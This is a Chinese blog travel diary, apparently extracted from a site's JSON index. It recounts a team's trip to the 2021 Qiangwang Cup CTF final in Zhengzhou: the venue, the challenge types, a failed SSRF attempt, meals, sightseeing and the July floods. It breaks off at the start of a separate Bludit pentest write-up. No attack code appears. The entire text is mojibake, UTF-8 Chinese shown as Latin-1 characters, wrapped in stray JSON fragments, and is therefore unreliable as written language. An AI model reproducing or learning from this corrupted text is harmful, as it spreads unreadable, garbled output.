32ï¼Œæœ€ç»ˆä»¥ç¬¬16åè¿›å…¥äº†çº¿ä¸‹èµ›ï¼Œèƒ½å¤Ÿæœ‰æœºä¼šå‡ºæ¥è§è§ ï¼ˆéš”å£ï¼‰ æ¸…åã€æµ™å¤§ã€ä¸Šäº¤ç­‰é«˜æ ¡ä»¥åŠè…¾è®¯ã€é•¿äº­ç­‰ä¼ä¸šçš„å¸¦å¸ˆå‚…ä»¬ã€‚ ï¼ˆå’•å’•å’•â€¦â€¦åˆ«å’•å•¦ï¼Œå†å’•è¿™ç¯‡æ¸¸è®°å°±æ²¡æœ‰å•¦ï¼ ï¼ï¼ï¼å¤š å›¾ é¢„ è­¦ï¼ï¼ï¼ ï¼ï¼ï¼æµ é‡ é¢„ è­¦ï¼ï¼ï¼ ï¼ˆè™½ç„¶ä¼ ä¸Šæ¥ä¹‹å‰å·²ç»å°½å¯èƒ½å‹ç¼©äº† é…’åº—å…ˆè¯´è¯´ä½å®¿å§ã€‚ ä¸»åŠæ–¹å®‰æ’çš„é…’åº—ï¼Œç¯å¢ƒè¿˜æ˜¯æŒºä¸é”™çš„ï¼Œè¿™ä¸ªæ¡Œå­å’Œå°æ²™å‘å°±æŒºé€‚åˆå¤šäººååœ¨ä¸€èµ·è§£é¢˜çš„ã€‚ ï¼ˆå¯æƒœå’±ä¹ˆå¾—ç»è´¹ï¼Œå°±åªæœ‰æ‰“çº¿ä¸‹èµ›çš„é˜Ÿå‘˜æ¥äº†çº¿ä¸‹ï¼Œäººå®¶æœ‰çš„æ•´ä¸ªæˆ˜é˜Ÿä¸€èµ·æ¥çš„â€¦â€¦ é…’åº—çš„è‡ªåŠ©æ™šé¤è¿˜æŒºä¸é”™ï¼Œä¸»åŠæ–¹è¿˜æ˜¯æŒºå£•çš„ã€‚ æ¯”èµ›æ¯”èµ›åœºåœ°åœ¨ç½‘ç»œå®‰å…¨ç§‘æŠ€é¦†ï¼Œå°±åœ¨é…’åº—æ—è¾¹ã€‚æ„Ÿè§‰æ˜¯ä¸“é—¨ä¸ºå¼ºç½‘æ¯è¿™æ¯”èµ›ä¿®äº†ä¸€æ ‹æ¥¼ï¼Œä½œä¸ºèµ›äº‹æ°¸ä¹…ä¸¾åŠåœ°ç‚¹ï¼Œé¡ºä¾¿åšç½‘ç»œå®‰å…¨çš„ç§‘æ™®æ•™è‚²åŸºåœ°ä¹‹ç±»çš„ã€‚ ç”šè‡³æ‰“ç€æ¯”èµ›å‘ç°æœ‰æ¸¸å®¢æ¥å‚è§‚ï¼Œæ‰çŸ¥é“å’±æ˜¯åœ¨äººå®¶æ—…æ¸¸æ™¯ç‚¹é‡Œæ‰“æ¯”èµ›å•Šâ€¦â€¦ åœºåœ°çš„å¸ƒç½®è¿˜æ˜¯æŒºæœ‰æ°”åŠ¿çš„ï¼Œæ‰€æœ‰æˆ˜é˜Ÿå›´ç€ä¸­é—´ä¸€ä¸ªå¤§åœ†ç›˜ï¼Œæ­£å‰æ–¹ä¸‰å—å¤§å±å¹•ï¼Œä¸­é—´å±å¹•ä¸‹é¢æ˜¯æŒ‘æˆ˜åŒºï¼Œå¾€å‰æ˜¯è§£è¯´å¸­ã€‚ æ¯”èµ›çš„æ—¶é—´æ˜¯ 7.10 ä¸Šåˆ9ç‚¹ - 7.11 ä¸‹åˆ17ç‚¹ï¼Œæ—¶é•¿32å°æ—¶ï¼Œè¿˜æ˜¯æŒºé¡¶çš„ã€‚ èµ›åˆ¶æ˜¯ Cold Downï¼ˆCDï¼‰å’Œ Real Worldï¼ˆRWï¼‰åŒæ—¶è¿›è¡Œï¼Œå…¶å®éƒ½æ˜¯è§£é¢˜èµ›ã€‚ CD èµ›åˆ¶ è²Œä¼¼æ˜¯ä»Šå¹´æ‰å‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯æ‰€å¾—åˆ†æ•°ä¸ è§£å‡ºçš„é˜Ÿä¼æ•° åŠ è§£é¢˜æ—¶é—´ éƒ½æœ‰å…³ç³»ï¼Œå¾—åˆ†æ˜¯éšè§£é¢˜é˜Ÿæ•°è¡°å‡çš„åŸºç¡€åˆ†+éšæ—¶é—´è¡°å‡çš„åŠ æˆåˆ†ã€‚å…¶å®å°±å¼•å…¥äº†ä¸ªæ—¶é—´å› ç´ å•¦ã€‚ RW é¢˜ç›® ç®—æ˜¯ç¬¬ä¸€æ¬¡æ¥ç©ï¼Œé¢˜ç›®é’ˆå¯¹çš„æ˜¯çœŸå®åœºæ™¯ä¸­çš„ç¯å¢ƒæ¥å‡ºçš„é¢˜ã€‚è¿™æ¬¡ä¸€ä¸Šæ¥å°±ç»™æ¯ä¸ªé˜Ÿå‘äº†ä¸ªå°ç±³è·¯ç”±å™¨ï¼ˆä¸‹å›¾ï¼‰ï¼Œé™„å¸¦äº†ä¸ªUç›˜ï¼Œé‡Œé¢æœ‰ RW æ‰€æœ‰é¢˜ç›®çš„é™„ä»¶ã€‚128GB çš„ Uç›˜ï¼Œå…¨æ˜¯å‹ç¼©åŒ…éƒ½è¦å æ»¡äº†ã€‚ æ¯”èµ›å¼€å§‹å‰ï¼Œå·¥ä½œäººå‘˜æŠŠå°æœ‰é¢˜ç›®åç§°çš„æ——å­ğŸš©æ”¾åˆ°äº†åœºåœ°ä¸­å¤®çš„å°å­ä¸Šï¼ŒCD å’Œ RW é¢˜ç›®åˆ†åˆ«åœ¨ä¸¤è¾¹ã€‚å•Šæ˜¯çœŸæ­£çš„ å¤ºæ——èµ›ï¼Œå¯æ˜¯åªæœ‰ä¸€è¡€æ‰èƒ½æ‹¿åˆ°ï¼Œå‘œå‘œå‘œã€‚ æ¯”èµ› CD ç›¸å…³çš„é¢˜ç›®ä¸»è¦åŒ…æ‹¬ web å†…ç½‘æ¸—é€ã€å¯†ç å­¦ã€åŒºå—é“¾æ™ºèƒ½åˆçº¦ã€pwnã€é€†å‘ç­‰ã€‚ RW åŒ…æ‹¬ Windowsã€MacOSã€Chromeã€IEsbxï¼ˆIEæµè§ˆå™¨ï¼‰ã€ESXisbxã€Mi Routerï¼ˆå°ç±³è·¯ç”±å™¨Proï¼‰ã€OAï¼ˆæ˜¯ä¸ª Webï¼‰ã€VGA(VirtualGuestAttack)ï¼ˆQEMU çš„è™šæ‹Ÿæœºé€ƒé€¸ï¼‰ã€EthJumpï¼ˆåŒºå—é“¾æ™ºèƒ½åˆçº¦ï¼‰ï¼Œä¸€å…±å…«é“é¢˜ã€‚ é¢˜ç›®è¿˜æ˜¯æŒºé¡¶æŒºå¤´ç§ƒçš„ï¼Œå–µå–µä¸»è¦æ˜¯çœ‹å misc å’Œ web æ–¹å‘çš„é¢˜ï¼Œæ¯”å¦‚ mDMZ é‚£ä¸ªå†…ç½‘æ¸—é€ç³»åˆ—ã€ruaã€OA ä¹‹ç±»ã€‚ å¯æƒœå–µå–µåˆä¸å’‹æ‡‚ binaryï¼Œåªèƒ½é¡ºä¾¿å’Œé˜Ÿå‹ä¸€èµ·æ—¥æ—¥è·¯ç”±å™¨ï¼Œé…é…ç½‘ç»œï¼Œç»™é˜Ÿå‹é…é…ç¯å¢ƒï¼Œç»™é˜Ÿå‹ ç«¯èŒ¶å€’æ°´æ‰“æ‰“æ‚ è¿™æ ·å­å•¦ï¼ˆbushi ï¼ˆå¯»æ€ç€æ˜¯ä¸æ˜¯å•¥æ—¶å€™å¾—å­¦å­¦ binary äº† Web é¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ï¼Œåé¢å•ç‹¬å†™ä¸€ç¯‡ Writeup å§ï¼Œå¦‚æœä¸å’•çš„è¯ã€‚ ä¸‹é¢è¿™å‡ æ®µæ˜¯åæ§½æ—¶é—´ï¼Œå¦‚æœä¸æƒ³çœ‹å°±è·³è¿‡å§ã€‚ è¯´å¥½çš„æœ‰ èŒ¶æ­‡åŒº å‘¢ï¼Œç„¶è€Œæ¯æ¬¡å»çœ‹é‚£è¾¹éƒ½æ˜¯ç©ºçš„â€¦â€¦å”¯ä¸€æœ‰çš„ä¸€æ¬¡æ˜¯ç¬¬äºŒå¤©ä¸€å¤§æ—©å»çš„æ—¶å€™ï¼Œè¿˜èƒ½å‹‰å¼ºæ‘¸ä¸ªå¯ä¹ã€ç«è…¿è‚ ã€‚ï¼ˆä¸»åŠæ–¹è¯´æ˜¯èŒ¶æ­‡è¢«å¿—æ„¿è€…å’Œè§‚ä¼—æ’¸èµ°äº†ï¼Œå–µï¼Ÿï¼Ÿï¼Ÿ é¢˜ç›®ç¯å¢ƒåœ¨å†…ç½‘ï¼Œåœºä¸Šæ˜¯é€šå¤–ç½‘çš„ï¼Œå‡ºå£æ˜¯éƒ‘å·è”é€šã€‚å’±ç½‘å£è™½ç„¶åå•†åˆ°äº†åƒå…†ï¼Œä½†å¤–ç½‘è·‘æ»¡äº†ä¹Ÿåªèƒ½è·‘åˆ° 1.å‡  MiB/s è¿™æ ·ï¼Œé…ä¸ªå¤§æ¦‚ 1GiB çš„ç¯å¢ƒï¼Œç¡¬æ˜¯ç»™å’±ä¸‹äº†åå‡ äºŒååˆ†é’Ÿï¼Œå¥½ä¸å®¹æ˜“æ•´ä¸‹æ¥äº†å‘ç° Windows ä¸‹åˆè·‘ä¸èµ·æ¥ï¼Œäºæ˜¯åˆåˆ°è™šæ‹Ÿæœºé‡Œæ‹‰äº†ä¸ª Linux ç¯å¢ƒçš„ï¼Œåˆåå‡ äºŒååˆ†é’Ÿè¿‡å»äº†ï¼Œè¿™ç½‘é€Ÿé…ç¯å¢ƒçœŸå¿ƒæ€å´©äº†â€¦â€¦è¿˜å¥½æœ€åè¿˜æ˜¯è·‘å‡ºæ¥äº†ã€‚ å¦å¤–ï¼Œä¸»åŠæ–¹ç»™çš„ä¸€ä¸ªç¯å¢ƒ Dockerfile æœ‰ç‚¹é—®é¢˜ï¼Œåˆšå¼€å§‹æ˜¯æ¢æºæ¢çš„é˜¿é‡Œæºæ„å»ºä¸èµ·æ¥ï¼Œåæ¥æ‰‹åŠ¨æ¢äº†åˆ«çš„æºå‘ç° apache è¿˜æ˜¯ build ä¸èµ·æ¥ï¼Œç»™é˜Ÿå‹çœ‹å‘ç°ä¹Ÿä¸è¡Œã€‚æœ€åä¹ˆå¾—åŠæ³•ï¼Œå¯»æ€ç€ä¹Ÿæ²¡å¿…è¦å•Šï¼Œè¿˜ä¸å¦‚è‡ªå·±ç›´æ¥èµ·ä¸ª PHP + MySQLâ€¦â€¦èµ›åå’Œå…¶ä»–é˜Ÿå¸ˆå‚…å” å—‘ï¼Œä»–ä»¬ä¹Ÿåæ§½è¿™ä¸ªæ¥ç€ï¼Œæœ€åä¹Ÿæ˜¯è‡ªå·±èµ· PHP äº†ã€‚ ï¼ˆè¿™ç¯å¢ƒèµ·ä¸æ¥å…¶å®æŒºå½±å“å¿ƒæ€çš„ï¼Œç”±äºç¯å¢ƒé—®é¢˜è€½è¯¯äº†æŒºå¤šæ—¶é—´å¯¼è‡´åé¢ä¹Ÿæ²¡åšå‡ºè¿™é¢˜ï¼Œå”‰ï¼Œä¸»è¦ä¹Ÿæ²¡åŠæ—¶è°ƒæ•´ç­–ç•¥ï¼Œå’±è‡ªå·±ä¹ŸèƒŒé”… æ¯”èµ›æœŸé—´çš„å‡ é¤æ˜¯é€é¤ï¼Œç„¶è€Œå…¶å®å¹¶ä¸å¥½åƒâ€¦â€¦ æ¯”èµ›ç°åœºçš„æ‘„åƒæœºä½ä¹Ÿè´¼ä¸°å¯Œï¼Œè¿˜æ—¶ä¸æ—¶æœ‰æ‘„å½±å¸ˆè¿‡æ¥æ‹ç…§ï¼Œæ¯”èµ›è¿˜æœ‰ç›´æ’­ï¼Œåª’ä½“æ”¯æŒè¿˜æ˜¯æŒºåˆ°ä½çš„ã€‚ ç°åœºçš„å¤§å±åŠ¨ç”»å…¶å®è¿˜æŒºç‚«é…·çš„ï¼Œç„¶è€Œåšä¸å‡ºæ¥å°±æ˜¯äº†â€¦â€¦ å¿«çœ‹è§£è¯´å¸­ä¸Šï¼ˆç©¿ç€ GitHub Tæ¤ï¼‰çš„ NanoApeï¼ é¢˜ç›®åšä¸å‡ºæ¥çš„æ—¶å€™å°±æŠ¬å¤´æœ›æœ› Nanoï¼Œæ•´æŒºå¥½çš„ã€‚ å¯æƒœå†…ç½‘æ¸—é€åŠå¤©æ—¥ä¸ä¸‹æ¥ï¼ŒSSRF åŠå¤©æ‰“ä¸é€šï¼Œè·¯ç”±å™¨æ‰¾åˆ°äº†æ¼æ´ç‚¹ä½†åŠå¤©æ‰¾ä¸åˆ°å“ªé‡Œè°ƒç”¨â€¦â€¦å”‰è¿˜æ˜¯å¤ªèœäº†ã€‚ å†è¯´è¯´ rua é‚£é¢˜ SSRFï¼Œä»– flag åœ¨ docker å†…ç½‘å¦ä¸€å°æœºå™¨ä¸Šï¼Œéœ€è¦ç»•è¿‡å¤–å±‚é¶æœºçš„ nginx é‡Œç”¨ lua å†™çš„ä¸€ä¸ª æ­£åˆ™åŒ¹é…ã€‚è¿™é¢˜æœ€å¼€å§‹çš„é¶æœºç‰¹å¡ï¼Œåæ¥ä¸»åŠæ–¹åˆå¼€äº†å‡ ä¸ªæ–°çš„ï¼Œå°è¯•äº†é€šè¿‡é¶æœºç›´æ¥å‘åŒ…åˆ°è‡ªå·±çš„ VPSï¼Œhexdump çœ‹äº†æ²¡å‘ç°å•¥é—®é¢˜ï¼Œç„¶è€Œæ‰“åˆ°å†…ç½‘æœºå™¨ä¸€ç›´ POST ä¸è¿‡å»ã€‚ èµ›åå’Œå…¶ä»–å¸ˆå‚…äº¤æµï¼Œä»–éƒ¨åˆ†é¶æœºç¯å¢ƒé…å¾—æœ‰ç‚¹é—®é¢˜ï¼Œå’Œä»–ä»¬ç±»ä¼¼çš„ payload ç„¶è€Œå’±å°±æ˜¯æ‰“ä¸é€šï¼Œåæ¥æƒ³æƒ³ä¼°è®¡æ˜¯ç”±äºä¸åŒé¶æœºçš„å†…ç½‘ç¯å¢ƒä¸ä¸€æ ·å¯¼è‡´çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒé¶æœºå¯¹åº”çš„ docker å†…ç½‘ IP å¯èƒ½ä¸ä¸€æ ·ï¼Œä½†å’±æ‰“çš„æ—¶å€™é»˜è®¤äº†æ˜¯å®Œå…¨ä¸€è‡´çš„ç¯å¢ƒï¼Œäºæ˜¯ç”¨äº†æœ€å¼€å§‹å‘ç°çš„å†…ç½‘é¶æœº IP ç›´æ¥æ‰“çš„ä¸åŒé¶æœºã€‚å¦å¤–ï¼Œéƒ¨åˆ†é¶æœºç¯å¢ƒå¾ˆå¡ï¼Œlua http è¯·æ±‚è¶…æ—¶çš„è¯ä¹Ÿæ˜¯è¿”å› nilï¼Œå…¶ä¸­ä¹Ÿå¯¼è‡´äº†ä¸€äº›è¯¯åˆ¤ã€‚è¿™æ ·ä¸€æƒ³å¿ƒæ€æ›´å´©äº†å•Šï¼å–µå‘œå‘œå‘œã€‚ äºæ˜¯ä¹æ¯”èµ›çš„æœ€åä¸€ä¸ªå°æ—¶ï¼Œå…¶ä»–å‡ ä¸ªæ‰“ binary çš„é˜Ÿå‹å·²ç»å¼€å§‹è®¨è®ºè¦å»å“ªé‡Œç©äº†ï¼Œå–µå–µè¿˜åœ¨é‚£ä¸€ä¸ªäººçœ‹ webï¼Œè‰ï¼Œå¤ªåå•¦ï¼ ä¸è¿‡è¿˜å¥½å•¦ï¼Œæœ€åæ‹¿äº†ä¸ª äºŒç­‰å¥–ï¼Œå–µï¼ Asuri NB å°±å®Œäº‹äº†ï¼ æ— è®ºå¦‚ä½•ï¼Œéå¸¸æ„Ÿè°¢å‡ºé¢˜å¸ˆå‚…ä»¬çš„ç²¾å¿ƒå‡ºé¢˜ï¼Œå¿—æ„¿è€…ã€å·¥ä½œäººå‘˜çš„è¾›å‹¤ä»˜å‡ºå“ˆã€‚ é¢åŸº &amp; æ¸¸ç© &amp; etc.æ¯”èµ›å‰ä¸€å¤©æ™šä¸Šå°±å»æ‰¾ NanoApe é¢åŸºäº†ï¼ŒåˆæŠ±åˆ° Nano å•¦ï¼å¥½å¯çˆ±å•Šå•Šå•Šï¼Œå–µ~ æœ¬æ¥æƒ³é¢ Yoshino-s Yè€å¸ˆçš„ï¼Œç»“æœæ¯”èµ›ç»“æŸåŠå¤©æ²¡æ‰¾åˆ°äººï¼Œæœ€ååªæ˜¯åœ¨é…’åº—ç”µæ¢¯è§äº†ä¸€é¢ï¼ŒYè€å¸ˆå°±åŒ†åŒ†èµ¶é£æœºå»äº†ã€‚ é¢äº† Y4tackerã€FantasqueX ç­‰å¸ˆå‚…ã€‚åæ¥åˆå»å¬ Redbud çš„å¤§å¸ˆå‚…è®²äº†è®²è·¯ç”±å™¨æ€ä¹ˆæ—¥â€¦â€¦ Orz æ¥ä¸‹æ¥çš„è¯å…¶å®å°±æ˜¯æ„‰å¿«çš„ æ—…æ¸¸æ—¶é—´ å•¦~ å’Œé˜Ÿå‹çš„åˆé¤ï¼Œæ°äº† æ²³å—çƒ©é¢ã€‚ é¢åœ¨é‡Œé¢ï¼Œå¯»æ€ç€åº”è¯¥æä¸€æå†æ‹çš„ï¼ˆï¼Ÿ çº¦äº† éš”å£ æ¸…å Redbud çš„å¸ˆå‚…ï¼Œä¸€èµ·å» éƒ‘å·é»„æ²³æ–‡åŒ–å…¬å›­ é€›é€›ã€‚ è¿™ä¸ªåœ°è´¨åšç‰©é¦†çš„è‹±æ–‡ç¿»è¯‘å¥½å¥‡æ€ªå•Šâ€¦â€¦ No moking warm tips ç„¶è€Œé‚£å¤©å¤ªé˜³å¤§å¾—äºšæ‰¹ï¼Œå¤©æ°”çƒ­å¾—ä¸è¡Œï¼Œå¤§å®¶å°±åœ¨æ™¯åŒºé‡Œéšä¾¿è½¬äº†è½¬å°±å›å»äº†â€¦â€¦ æ™šä¸Šä¸€èµ· æ°äº†æ—¥æ–™ã€‚ æœåŠ¡å‘˜æœ›ç€ Nanoï¼šâ€œæˆ‘ä»¬æ²¡æœ‰å„¿ç«¥å§ï¼Ÿâ€ ï¼ˆå¤§å®¶ç¬‘ ä»¥åŠï¼Œå½“ç„¶å°‘ä¸äº† ç¥ç§˜çš„é¢åŸºä»ªå¼ï¼Œå˜¿å˜¿~ éƒ‘å·çš„å¤œç”Ÿæ´»è¿˜ç®—çƒ­é—¹ï¼Œä¹Ÿå¯èƒ½å› ä¸ºè¿™é‡Œé è¿‘å¸‚ä¸­å¿ƒï¼Ÿ è¿™ä¸ªæ¥¼çš„å¤–å¢™æœ‰ç‚¹æ„æ€ã€‚ ä¸€èµ·å»äº†ä¸€å®¶ çœ‹ä¸Šå»å¿«è¦å€’é—­çš„ KTVï¼Œä¸€ç›´å”±åˆ°æ·±å¤œã€‚ Nano å”±é«˜éŸ³å¥½å¬ï¼å–µå–µå–µå–µå–µå–µ~ ï¼ˆå›¾æ–‡æœ‰ç‚¹å…³ç³»ï¼‰ éƒ½è¿™æ ·äº†è¿˜ä¸ç®—å¿«å€’é—­ä¹ˆï¼ˆè·‘ åä¸€å¤©ï¼Œåƒäº†ä¸ªç ‚é”…é¸¡çƒ©é¢ï¼ˆï¼Ÿï¼‰ï¼Œå¤§æ¦‚å«è¿™ä¹ˆä¸ªåå­—å§ï¼Œåˆ†é‡ç¡®å®æŒºè¶³æŒºå®åœ¨çš„ã€‚ å…ˆå’Œå¤§å¸ˆå‚…ä»¬é“åˆ«äº†ï¼Œu1s1ï¼Œæœ‰ç‚¹ä¸èˆï¼ŒæŒºéš¾å¾—æœ‰æœºä¼šå‡ºæ¥è§é¢çš„ã€‚ ä¹‹åå»äº† æ²³å—åšç‰©é™¢ã€‚ è¿™é‡Œæ–‡ç‰©çœŸæ»´å¤šï¼Œä»ä¸‹åˆ°ä¸Šä¾æ¬¡ä»å¤åˆ°ä»Šå±•è§ˆäº†å„ä¸ªæ—¶æœŸå„ä¸ªé¢†åŸŸçš„æ–‡ç‰©ã€‚ é¦†å†…è¶³å¤Ÿå¤§ï¼Œï¼ˆå¦‚æœå¥½å¥½å‚è§‚çš„è¯ï¼‰å¯ä»¥é€›ä¸Šä¸€ä¸¤ä¸ªå°æ—¶ï¼Œå¯èƒ½è¿˜ä¸å¤Ÿã€‚ æ²³å—åšç‰©é™¢é‡Œæä¾›äº†è¯­éŸ³è®²è§£å™¨ç§Ÿå€Ÿï¼Œçœ‹ä¸Šå»æ˜¯ä¸ªæ‰‹æœºç±»ä¼¼ç‰©ï¼Œé€šè¿‡æ‘„åƒå¤´é‡‡é›†å›¾åƒè¿›è¡Œè¯†åˆ«ï¼ŒåŒ¹é…æ•°æ®åº“ä¸­çš„æ–‡ç‰©æ•°æ®è¿›è€Œæä¾›ä»‹ç»ã€‚ç„¶è€Œå…¶å®è¯†åˆ«æ•ˆç‡åªèƒ½è¯´è¿˜è¡Œï¼Ÿå€’æ˜¯çœ‹åˆ°ä¸å°‘æ¸¸å®¢ï¼ˆç‰¹åˆ«æ˜¯å°æœ‹å‹ï¼‰åŠå¤©è¯†åˆ«ä¸å‡ºæ¥ç„¶åè¯†åˆ«åˆ«çš„å»äº†ã€‚ï¼ˆå–µå–µçœ‹ä¸æ‡‚ï¼Œè¯è¯´æœ‰å¤šå°‘å°æœ‹å‹ä¼šåœ¨æ„è¿™æ–‡ç‰©æ˜¯å•¥å‘¢ï¼Œæ„Ÿè§‰åªæ˜¯å¥½ç©ç½¢äº†å§ï¼‰ã€‚ä»¥åŠï¼Œçœ‹é¦†å†…çš„æ ‡è¯†ï¼Œè®²è§£å™¨åº”è¯¥ä¹Ÿæœ‰å¥½å‡ ä»£äº§å“äº†ã€‚ ä¹Ÿæœ‰ä¸å°‘å¿—æ„¿è€…åšè®²è§£å‘˜ï¼Œå‚è§‚é€”ä¸­å°±é‡åˆ°äº†å¯¹æ–‡ç‰©ç»“æ„ã€å¯“æ„ã€å†å²ç­‰éƒ½å¾ˆäº†è§£çš„è€çˆ·çˆ·ï¼Œä¸šä½™æ—¶é—´æ¥å¿—æ„¿è®²è§£çš„é˜¿å§¨ï¼Œè¿˜ç¢°åˆ°äº†çœ‹ä¸Šå»æŒºå¹´è½»ä½†å…¶å®å·²ç»é€€ä¼‘çš„é˜¿å§¨ï¼Œä¸­æ–‡ç³»æ¯•ä¸šï¼Œå‡ºäºå¯¹æ–‡ç‰©å’Œå†å²çš„å…´è¶£æ¥åšå¿—æ„¿è®²è§£çš„ï¼Œä¹Ÿæ‰æ¥æ²¡å¤šä¹…ã€‚å¬å¬æ•…äº‹ä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ã€‚ åšç‰©é™¢å†…æœ‰ä¸å°‘ç»„é˜Ÿå‚è§‚çš„å°æœ‹å‹ï¼Œå¯èƒ½æ˜¯å•¥å¤ä»¤è¥ã€ç´ è´¨æ‹“å±•ä¹‹ç±»çš„å§ï¼Œä¹Ÿæœ‰å¾ˆå¤šå®¶é•¿å¸¦å­©å­å‚è§‚ã€‚åšç‰©é™¢é‡Œæœ‰æ–‡åˆ›å•†åº—ï¼Œè¿˜çœ‹åˆ°äº†æ–‡ç‰©è€ƒå¤ç›²ç›’ã€å¤åŸç›²ç›’ã€åšç‰©é¦†çºªå¿µæŠ¤ç…§ä¹‹ç±»çš„ï¼Œç§‘æ™®æ•™è‚²é¡ºä¾¿åŠ ç‚¹å¸¦è´§æ„ä¹‰å¯èƒ½å¦‚æ­¤å§ã€‚ å¤©æ°”è´¼çƒ­ï¼Œå‡ºäº†åšç‰©é™¢å°±åœ¨å‘¨è¾¹éšæ„é€›äº†é€›ã€‚ ï¼ˆèƒŒç€æ¸¸æˆæœ¬åŠ ä¸€å—ç –å‡ºæ¥ç©ç´¯æ­»å•¦ å½“ç„¶è¿˜å°‘ä¸äº† å¸çŒ«çŒ« å•¦ï¼ é¡ºä¾¿çœ‹çœ‹å‚æ™šå’Œå¤œæ™šçš„å¯¹æ¯”ã€‚ æ™šä¸Šåƒçš„ä¹Ÿç®—æ˜¯æ—¥å¼çš„é¥­å§ã€‚ï¼ˆå–µå–µåƒå•¥è€çº ç»“äº† å‡ºæ¥åœ¨æƒ³æ™šä¸Šè¿˜èƒ½å»å“ªé€›é€›ï¼Œæ‰“å¼€åœ°å›¾é¡ºç€åœ°é“æ‰¾å“ªé‡Œæ¯”è¾ƒé¡ºè·¯ä¹Ÿæ¯”è¾ƒè¿‘çš„ã€‚ ä¸­åŸç¦å¡”ï¼Œå—¯ï¼Œå°±ä½ äº†ï¼ ä¸æ„§æ˜¯ ç›®å‰ä¸–ç•Œä¸Šæœ€é«˜çš„å…¨é’¢ç»“æ„å¡”ï¼Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ åˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†ï¼Œæ”¶æ‹¾æ”¶æ‹¾å›å®¶äº†ã€‚ æœ€åï¼Œæ”¾ç‚¹ é£æœºä¸Šçš„é£æ™¯ å§ã€‚ å°ç»“å¼ºç½‘æ¯ä¸»åŠæ–¹è¿˜æ˜¯æŒºçƒ­æƒ…æŒºè´´å¿ƒçš„ï¼Œå¼ºç½‘æ¯ S5 åœ†æ»¡æˆåŠŸï¼Œæ’’èŠ±ï¼ğŸ‰ è¿™å‡ å¤©å’Œä¸å°‘å¸ˆå‚…é¢åŸºäº†ï¼ŒåˆæŠ±åˆ° NanoApe äº†ï¼Œå¯æƒœéƒ‘å·è¿™è¾¹æ²¡å•¥å¥½ç©çš„åœ°æ–¹ï¼Œåªèƒ½éšæ„é€›é€›è¿™æ ·ã€‚ æ€»ä¹‹ï¼Œè¿™å‡ å¤©ç©å¾—å€’æ˜¯æŒºå¼€å¿ƒçš„ï¼Œå–µå–µ~ ç„¶åå›æ¥åŠ¨ä¸åŠ¨æƒ³ç¡å¤§è§‰ï¼Œæ‰“æ¯”èµ›+ç©ç´¯æ­»äº†ï¼Œå‘¼å™œå‘¼å™œâ€¦â€¦ å•Šï¼Œè¿™ç¯‡æ¸¸è®°å’•äº†å¿«æœ‰ä¸€å‘¨äº†å§ï¼Œç»ˆäºå†™å®Œäº†â€¦â€¦ å†™çš„æ¯”è¾ƒéšæ„ï¼Œå¦‚æœå“ªé‡Œè¯´çš„æœ‰é—®é¢˜ï¼Œè¿˜è¯·å„ä½å¤§å¸ˆå‚…å¤šå¤šæŒ‡æ•™ï¼ŒOrzï¼ Extensive ReadingCTF | 2021 å¼ºç½‘æ¯çº¿ä¸Šèµ› Web&amp;Misc WriteUp ç¢ç¢å¿µ | X-NUCA 2020 å…¨å›½é«˜æ ¡ç½‘å®‰è”èµ›æ€»å†³èµ› æ·±åœ³æ¸¸è®° ï¼ˆæºœäº†æºœäº†å–µ~ å–µå‘œï¼Œ7.20 æ²³å— â€œåƒå¹´ä¸€é‡â€ ç‰¹å¤§æš´é›¨ï¼Œå“¦ï¼Œæå€¼æš´é›¨ä¹Ÿå¤ªé˜”æ€•äº†ï¼Œä¸€å°æ—¶é™æ°´é‡ç›¸å½“äºå…¨å¹´é™æ°´é‡ä¸‰åˆ†ä¹‹ä¸€â€¦â€¦ éƒ‘å·ä¸¥é‡å†…æ¶ï¼Œåœ°é“ã€ç«è½¦åœè¿ï¼Œå¤šåœ°åœç”µåœæ°´ï¼Œé€šè®¯ä¸­æ–­ï¼Œå¬è¯´éƒ¨åˆ†éª¨å¹²æ ¸å¿ƒæœºæˆ¿è¢«æ·¹äº†ï¼ŒCERNET éƒ‘å·æ ¸å¿ƒèŠ‚ç‚¹ä¸Šæ¼”äº†ä¸€åœºæƒŠå¿ƒåŠ¨é­„çš„ç½‘ç»œä¿å«æˆ˜â€¦â€¦ è¿™æ¬¡ç‰¹å¤§é™é›¨é€ æˆçš„å†…æ¶ï¼Œç«Ÿç„¶å°†çœä¼šåŸå¸‚éƒ¨åˆ†éª¨å¹²æ ¸å¿ƒæœºæˆ¿ä¹Ÿæ·¹äº†ï¼Œè€Œä¸”ä¸»å¤‡æœºæˆ¿éƒ½å‘ç”Ÿé›¨æ°´å€’çŒã€‚åœ¨æœ¬åœ°ä¸»å¤‡HLRéƒ½å—ç¾çš„æƒ…å†µä¸‹ï¼Œè¿è¥å•†å¯ç”¨äº†ä½äºé‚»è¿‘çœä»½çœä¼šåŸå¸‚çš„å¤‡ä»½HLRï¼Œä¸´æ—¶é¡¶æ›¿é€€æœçš„æœ¬åœ°HLRï¼Œä¿éšœä¸šåŠ¡çš„å®ç°ã€‚ via éƒ‘å·æ´ªç¾ï¼Œé€šä¿¡ç½‘ç»œçš„å®¹ç¾æœºåˆ¶ï¼Œå‘æŒ¥ä½œç”¨äº†å—ï¼Ÿ å¦ä¸€è¾¹ï¼Œå—äº¬ç¦„å£æœºåœºå‘ç°äº†å¤šä¾‹æ–°å† é˜³æ€§â€¦â€¦ å–µå‘œï¼Œæ²³å—æŒºä½ï¼Œå—äº¬æŒºä½ï¼Œå¸Œæœ›å¤§å®¶éƒ½æ²¡äº‹å°±å¥½äº†ã€‚","path":"2021/07/19/Life_2021QiangwangFinal_trip/"},{"title":"Pentest | 2021 ç™¾çµé¸Ÿå›¢é˜Ÿçº³æ–°ç©å®¶æ´»åŠ¨ Bludit v3.12.0 WriteUp","text":"å¼•è¨€ 2021.06 ç™¾çµé¸Ÿå›¢é˜Ÿçº³æ–°ç©å®¶æ´»åŠ¨ 2021å¹´6æœˆ27æ—¥ï¼Œæ–°çš„çº³æ–°ç©å®¶æ´»åŠ¨å¼€å§‹äº†ï¼Œè¿˜æ˜¯æ¸—é€æµ‹è¯•é¢˜ã€‚å¦‚æœæ‚¨æˆåŠŸæ‹¿ä¸‹ç›®æ 